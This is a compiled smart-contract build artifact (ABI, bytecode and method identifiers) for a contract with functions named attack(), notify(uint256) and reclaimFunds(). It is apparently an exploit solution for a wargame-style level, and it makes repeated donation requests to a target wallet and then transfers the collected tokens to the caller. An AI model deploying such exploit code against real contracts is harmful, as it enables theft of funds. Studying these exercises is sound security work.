{"abi":[{"type":"constructor","inputs":[{"name":"instance","type":"address","internalType":"address"}],"stateMutability":"nonpayable"},{"type":"function","name":"attack","inputs":[],"outputs":[],"stateMutability":"nonpayable"},{"type":"function","name":"notify","inputs":[{"name":"","type":"uint256","internalType":"uint256"}],"outputs":[],"stateMutability":"nonpayable"},{"type":"function","name":"reclaimFunds","inputs":[],"outputs":[],"stateMutability":"nonpayable"}],"bytecode":{"object":"0x60e060405234801561000f575f5ffd5b5060405161043538038061043583398101604081905261002e916100b5565b6001600160a01b03811660808190526040805163521eb27360e01b815290515f929163521eb2739160048083019260209291908290030181865afa158015610078573d5f5f3e3d5ffd5b505050506040513d601f19601f8201168201806040525081019061009c91906100b5565b6001600160a01b031660a081905260c052506100e29050565b5f602082840312156100c5575f5ffd5b81516001600160a01b03811681146100db575f5ffd5b9392505050565b60805160a05160c0516103206101155f395f6101c901525f8181607d0152818160fe01526101a101525f50506103205ff3fe608060405234801561000f575f5ffd5b506004361061003f575f3560e01c806398d078b4146100435780639e5faafc14610058578063cce4bd5214610060575b5f5ffd5b6100566100513660046102bc565b610068565b005b6100566100e9565b610056610164565b604051637c1b57e760e11b81523060048201527f000000000000000000000000000000000000000000000000000000000000000073ffffffffffffffffffffffffffffffffffffffff169063f836afce906024015f604051808303815f87803b1580156100d3575f5ffd5b505af19250505080156100e4575060015b505b50565b604051637c1b57e760e11b81523360048201527f000000000000000000000000000000000000000000000000000000000000000073ffffffffffffffffffffffffffffffffffffffff169063f836afce906024015f604051808303815f87803b158015610154575f5ffd5b505af19250505080156100e65750565b6040517f27e235e300000000000000000000000000000000000000000000000000000000815273ffffffffffffffffffffffffffffffffffffffff7f0000000000000000000000000000000000000000000000000000000000000000811660048301527f0000000000000000000000000000000000000000000000000000000000000000169063a9059cbb90339083906327e235e390602401602060405180830381865afa158015610218573d5f5f3e3d5ffd5b505050506040513d601f19601f8201168201806040525081019061023c91906102d3565b6040517fffffffff0000000000000000000000000000000000000000000000000000000060e085901b16815273ffffffffffffffffffffffffffffffffffffffff909216600483015260248201526044015f604051808303815f87803b1580156102a4575f5ffd5b505af11580156102b6573d5f5f3e3d5ffd5b50505050565b5f602082840312156102cc575f5ffd5b5035919050565b5f602082840312156102e3575f5ffd5b505191905056fea26469706673582212200e2ac96a71d3b7e77365ceba47c07b0cda82c85b1074c142f37c759db901a2fe64736f6c634300081c0033","linkReferences":{}},"methodIdentifiers":{"attack()":"9e5faafc","notify(uint256)":"98d078b4","reclaimFunds()":"cce4bd52"},"id":0}